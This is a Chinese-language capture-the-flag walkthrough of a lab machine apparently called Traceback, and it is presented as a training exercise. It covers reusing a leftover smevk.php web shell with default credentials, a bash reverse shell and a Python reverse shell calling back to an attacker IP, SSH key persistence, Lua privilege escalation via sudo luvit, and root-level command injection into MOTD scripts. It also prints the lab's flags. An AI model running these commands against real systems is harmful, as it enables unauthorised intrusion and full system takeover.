Phase 1

立足点：捡别人留的后门

搜索 "Xh4H web shells" 找到一个 GitHub 仓库，里面列出了常见 web shell 的文件名。逐个尝试，发现 smevk.php 存在：

http://10.129.50.24/smevk.php

用默认凭据 admin:admin 登录，获得 SmEvK_PaThAn Shell V3 面板。

🧒 儿童版 — 小偷忘了拔撬棍 这台机器已经被别人黑过了，黑客在网站上留了个"遥控器"（web shell）但没改默认密码。我们只是捡了别人留下的后门用——就像小偷撬完锁忘了拔撬棍，我们直接推门进去了。

确认身份 & 反弹 shell

id
uid=1000(webadmin) gid=1000(webadmin)

# 通过 web shell Console 反弹
bash -c 'bash -i >& /dev/tcp/10.10.15.65/4444 0>&1'

# 监听
$ nc -lvnp 4444
webadmin@traceback:/$

稳定 SSH 访问

生成 SSH 密钥对并添加到 authorized_keys，获得稳定连接：

$ ssh-keygen -t ed25519 -f /home/webadmin/.ssh/id_rsa -N ""
$ cp /home/webadmin/.ssh/id_rsa.pub /home/webadmin/.ssh/authorized_keys

# 将私钥复制到攻击机
$ chmod 600 id_rsa
$ ssh -i id_rsa webadmin@10.129.50.24
为什么要稳定 SSH？ Web shell 和反弹 shell 容易断线、不支持 Tab 补全和方向键。写入 SSH 公钥后就有了一个持久稳定的交互式终端，而且后面的 MOTD 提权也需要通过 SSH 登录来触发。
Phase 2

横向移动：webadmin → sysadmin（Luvit / Lua）

sudo -l 发现 luvit

webadmin@traceback:~$ sudo -l
(sysadmin) NOPASSWD: /home/sysadmin/luvit

webadmin@traceback:~$ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Luvit 是什么？ Luvit 是一个基于 Lua 的运行时（类似 Node.js 但用 Lua 语言），可以执行 Lua 脚本。Lua 的 os.execute() 和 io.popen() 可以执行系统命令。

Lua 一句话提权

webadmin@traceback:~$ echo "require('os');" > priv.lua
webadmin@traceback:~$ echo "os.execute('/bin/bash');" >> priv.lua
webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit ./priv.lua

sysadmin@traceback:~$ cat user.txt
1b4b1bd03e0ac6276aa28b0fc5140820
🧒 儿童版 — Lua 一句话提权 sysadmin 留了个 Lua 练习工具（luvit），而且允许 webadmin 以他的身份运行。我们写了一句 Lua 代码"请打开一个 bash 终端"，然后用 sysadmin 的身份运行它——于是就变成了 sysadmin。
Phase 3

权限提升：MOTD 脚本注入

发现可写的 MOTD 脚本

sysadmin@traceback:~$ ls -la /etc/update-motd.d/
-rwxrwxr-x 1 root sysadmin  981 Aug 26 2026 00-header
-rwxrwxr-x 1 root sysadmin  604 Aug 26 2026 10-help-text
-rwxrwxr-x 1 root sysadmin  299 Aug 26 2026 50-motd-news
-rwxrwxr-x 1 root sysadmin  604 Aug 26 2026 80-esm
-rwxrwxr-x 1 root sysadmin  299 Aug 26 2026 91-release-upgrade
MOTD 提权原理 MOTD（Message of the Day）是 SSH 登录时显示的欢迎信息。/etc/update-motd.d/ 下的脚本在每次 SSH 登录时以 root 身份执行。sysadmin 对这些脚本有写权限——在里面插入命令就等于以 root 身份执行。

注入反弹 shell

sysadmin@traceback:~$ nano /etc/update-motd.d/00-header
# 在文件末尾添加：
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.65",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);' &

触发执行

# 攻击机监听
$ nc -lvnp 6666

# 另一个终端 SSH 登录触发 MOTD
$ ssh -i id_rsa webadmin@10.129.50.24
# 收到 root shell
root@traceback:/#
# cat /root/root.txt
d9e63cc7441f5bf88a6cf9456fe051bb
🧒 儿童版 — 欢迎信息里藏后门 每次有人通过 SSH 登录时，系统会用管理员权限运行一些脚本来显示"欢迎信息"。我们在欢迎脚本里偷偷加了一句"顺便给我开个后门"。下次一登录，系统一边显示"欢迎来到 Xh4H land"，一边用 root 权限给我们开了个远程终端。
附录

知识点总结

搜索黑客名字找后门。

页面提到黑客名字时，搜索该黑客常用的 web shell 列表，逐个尝试文件名。很多 web shell 用默认密码（admin:admin），拿到就等于拿到初始访问。

SSH 密钥持久化比反弹 shell 更稳定。

拿到 shell 后第一件事：生成密钥对写入 authorized_keys。稳定、不断线、支持 Tab 补全和方向键，而且后续提权（如 MOTD）可能需要 SSH 登录来触发。

Luvit / Lua 的 os.execute() 等于提权。

只要能以其他用户身份运行 Lua 运行时（luvit、lua），写两行代码就能拿 shell。GTFOBins 上也有 Lua 的条目。

MOTD 脚本以 root 身份运行。

/etc/update-motd.d/ 下的脚本在每次 SSH 登录时以 root 身份执行。如果当前用户可以编辑这些脚本，就等于可以以 root 身份执行任意命令。关键前提：需要一个能 SSH 登录的用户来触发。

smevk.php 后门→sudo luvit Lua 提权→MOTD 脚本注入 → root
